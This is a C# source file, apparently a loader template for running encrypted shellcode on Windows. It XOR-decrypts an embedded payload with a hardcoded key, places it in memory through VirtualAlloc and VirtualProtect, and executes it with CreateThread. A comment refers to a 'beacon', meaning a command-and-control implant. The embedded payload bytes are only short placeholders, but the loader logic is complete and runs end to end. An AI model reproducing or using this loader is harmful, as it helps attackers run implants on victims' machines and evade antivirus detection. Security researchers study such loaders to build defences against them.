using System;
using System.Runtime.InteropServices;

namespace CreateThreadExample
{
    class Program
    {
        static void Main(string[] args)
        {
            // Determine architecture of executing process
            string arch;
            if (IntPtr.Size == 8)
            {
                arch = "x64";
            }
            else
            {
                arch = "x86";
            }

            // Get decrypted pic for shellcode matching our arch
            byte[] pic = Headers.GetAllDecryptedBytes(arch);
            
            // Allocate space for it
            IntPtr segment = Headers.VirtualAlloc(
                IntPtr.Zero,
                (uint)pic.Length,
                Headers.AllocationType.Commit,
                Headers.MemoryProtection.ReadWrite);

            // Copy over pic to segment
            Marshal.Copy(pic, 0, segment, pic.Length);

            // Reprotect segment to make it executable
            Headers.MemoryProtection oldProtect = new Headers.MemoryProtection();
            bool rxSuccess = Headers.VirtualProtect(segment, (uint)pic.Length, Headers.MemoryProtection.ExecuteRead, out oldProtect);

            // Prepare variables for CreateThread
            IntPtr threadId = IntPtr.Zero;
            Headers.SECURITY_ATTRIBUTES attrs = new Headers.SECURITY_ATTRIBUTES();
            // Create the thread
            IntPtr hThread = Headers.CreateThread(attrs, 0, segment, IntPtr.Zero, Headers.CreationFlags.Immediate, ref threadId);
            // Wait for its execution to finish, which is until beacon calls exit.
            Headers.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }

    class Headers
    {
        // This is the encryption key for your shellcode
        public static char[] cryptor = new char[] { '3', 'd', '8', '4', 'c', '9', '2', 'd', '0', '8', '\0' };
        #region API Calls

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        // https://pinvoke.net/default.aspx/coredll/WaitForSingleObject.html
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, UInt32 Wait);

        // https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(
        SECURITY_ATTRIBUTES lpThreadAttributes, // Don't need this
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        CreationFlags dwCreationFlags,
        ref IntPtr lpThreadId);

        #endregion

        #region Structs and Enums

        // https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
        [Flags]
        public enum CreationFlags
        {
            Immediate = 0,
            CreateSuspended = 0x00000004,
            StackSizeParamIsAReservation = 0x00010000
        }

        // https://pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        // https://pinvoke.net/default.aspx/kernel32/VirtualAlloc.html
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        #endregion

        #region Helper Functions

        public static byte[] GetAllDecryptedBytes(string arch)
        {
            // You'll need to ensure you have the encrypted shellcode
            // added as an embedded resource.
            byte[] rawData;
            if (arch == "x86")
            {
                rawData = new byte[] {
0xcf,0x8c,0xb1,0x34,0x63,0x39,0x52 };
            }
            else
            {
                rawData = new byte[] {
0xcf,0x2c,0xbb,0xd0 };
            }


            byte[] result = new byte[rawData.Length];
            int j = 0;

            for (int i = 0; i < rawData.Length; i++)
            {
                if (j == cryptor.Length - 1)
                {
                    j = 0;
                }
                byte res = (byte)(rawData[i] ^ Convert.ToByte(cryptor[j]));
                result[i] = res;
                j += 1;
            }
            return result;
        }

        #endregion
    }
}
